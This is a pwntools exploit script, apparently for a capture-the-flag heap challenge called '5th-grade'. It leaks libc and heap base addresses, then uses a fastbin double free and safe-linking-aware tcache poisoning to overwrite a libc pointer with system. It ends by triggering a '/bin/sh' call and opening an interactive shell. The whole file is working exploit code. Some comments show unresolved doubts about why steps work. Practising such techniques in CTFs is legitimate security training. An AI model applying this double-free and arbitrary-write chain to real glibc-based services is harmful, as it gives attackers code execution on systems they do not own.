from pwn import *

libc = ELF("./libc.so.6")

context.terminal = ["kitty"]
#p = remote("0.cloud.chals.io", 23662)
p = gdb.debug("./5th-grade", gdbscript="c")
# p = process("./4th-grade")

def malloc(idx, size=0x111):
    p.sendlineafter(b"n:", b"1")
    p.sendlineafter(b"?", str(idx).encode())
    p.sendlineafter(b"?", str(size).encode())

def edit(idx, data):
    p.sendlineafter(b"n:", b"2")
    p.sendlineafter(b"?", str(idx).encode())
    p.sendlineafter(b"?", data)

def free(idx):
    p.sendlineafter(b"n:", b"3")
    p.sendlineafter(b"?", str(idx).encode())

def view(idx):
    p.sendlineafter(b"n:", b"4")
    p.sendlineafter(b"? \n", str(idx).encode())
    return p.recvline().strip(b"\n")

malloc(0, 0x800)
malloc(1, 0)
free(0)
malloc(1, 0x2000)


libc_unsorted = u64(view(0).ljust(8, b"\x00"))
libc_base = libc_unsorted - 0x21a1d0
print(hex(libc_base))

malloc(69)
malloc(2, 0x111)
# TC -> 2 -> 0x00
free(2)
heap_base = (u64(view(2).ljust(8, b"\x00")) - 1) << 12
print(hex(heap_base))
target = libc_base + 0x00219098 - 0x18


# TC -> 3 -> 2 -> 0x00
malloc(5, 64)
malloc(6, 64)
# fill up tcache
for i in range(8):
    malloc(20 + i, 64)

for i in range(7):
    free(20 + i)

# put 5,6 into fastbin

free(5)
free(6)
free(5)

# drain tcache
for i in range(7):
    malloc(42, 64)

# 7 and 9 should be equal
# but from testing 8 and 10 are equal for whatever reason
malloc(7, 64)
malloc(8, 64)
malloc(9, 64)
malloc(10, 64)


# free(7)
# free 8 and 10 should still be valid
free(8)

print(hex(heap_base + 0x1920))
# write target into 10
edit(10, p64(((heap_base + 0x1920) >> 12) ^ target))

# malloc to pop off fastbin (this wont work because of tcache, do we have to drain it first?)
malloc(10, 64)
malloc(11, 64)

# arbitrary write into target
edit(11, p64(0) * 3 + p64(libc.sym.system + libc_base))

edit(69, b"/bin/sh")
p.sendline(b"4")
import time 
time.sleep(0.1)
p.sendline(str(69).encode())

p.interactive()